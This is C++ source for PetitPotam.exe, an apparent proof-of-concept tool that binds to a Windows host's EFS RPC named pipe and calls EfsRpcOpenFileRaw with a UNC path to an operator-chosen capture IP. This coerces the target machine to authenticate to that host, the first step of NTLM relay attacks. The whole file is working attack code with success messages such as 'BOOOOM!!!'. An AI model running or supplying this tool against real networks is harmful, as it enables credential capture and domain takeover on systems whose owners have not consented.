#include "efsr_h.h"
#include <iostream>

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{

    if (argc != 3) {
        printf("Usage: PetitPotam.exe [captureIP] [targetIP]");
    }
    else {

        RPC_STATUS status;
        RPC_WSTR StringBinding;
        RPC_BINDING_HANDLE Binding;

        wchar_t buffer[260];
        swprintf(buffer, 260, L"\\\\%s", argv[2]);

        wprintf(L"[-] Connecting to %s...\r\n", argv[2]);

        status = RpcStringBindingCompose(
            (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",  // Interface's GUID, will be handled by NdrClientCall
            (RPC_WSTR)L"ncacn_np",      // Protocol sequence
            (RPC_WSTR)buffer, // Network address
            (RPC_WSTR)L"\\pipe\\efsrpc", // Endpoint
            NULL,                       // No options here
            &StringBinding              // Output string binding
        );

        if (status != RPC_S_OK) {
            wprintf(L"[!] RpcStringBindingCompose status code: %d\r\n", status);
            return 1;
        }

        wprintf(L"[-] Binding to %ws...\r\n", StringBinding);

        status = RpcBindingFromStringBinding(
            StringBinding,              // Previously created string binding
            &Binding                    // Output binding handle
        );

        if (status != RPC_S_OK) {
            wprintf(L"[!] RpcBindingFromStringBinding status code: %d\r\n", status);
            return 1;
        }

        wprintf(L"[+] Successfully bound to pipe.\r\n");

        status = RpcStringFree(
            &StringBinding              // Previously created string binding
        );

        if (status != RPC_S_OK) {
            wprintf(L"[!] RpcStringFree status code: %d\r\n", status);
            return 1;
        }

        wprintf(L"[-] Authenticating as currently logged in user via SSPI...\r\n");

        status = RpcBindingSetAuthInfo(Binding, (RPC_WSTR)buffer, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);

        if (status != RPC_S_OK) {
            wprintf(L"[!] RpcBindingSetAuthInfo status code: %d\r\n", status);
            return 1;
        }

        RpcTryExcept
        {
            HRESULT result;
            PVOID pContext;
            wchar_t pwszFilePath[260];
            swprintf(pwszFilePath, 260, L"\\\\%s\\test\\Settings.ini\x00", argv[1]);

            wprintf(L"[-] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFilePath);

            result = EfsRpcOpenFileRaw(Binding, &pContext, pwszFilePath, 0);

            if (result == ERROR_BAD_NETPATH) {
                wprintf(L"[+] Got expected ERROR_BAD_NETPATH exception!!\r\n");
                wprintf(L"[+] BOOOOM!!!\r\n");
            }
            else if (result == ERROR_ACCESS_DENIED) {
                wprintf(L"[!] Got ERROR_ACCESS_DENIED! Make sure you are able to log in with the current user's credentials on the target server.\r\n");
                return 1;
            } else if (result == ERROR_INVALID_HANDLE) {
                wprintf(L"[!] Got ERROR_INVALID_HANDLE! On Windows Server 2025 and Windows 11, make sure the EFS service is running.\r\n");
            } else {
                wprintf(L"[!] EfsRpcOpenFileRaw status code: %d\r\n", result);
                return 1;
            }

            LocalFree(pwszFilePath);
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER);
        {
            wprintf(L"[!] Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
        }
        RpcEndExcept

            status = RpcBindingFree(
                &Binding                    // Reference to the opened binding handle
            );

        wprintf(L"[-] RpcBindingFree status code: %d\r\n", status);
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}
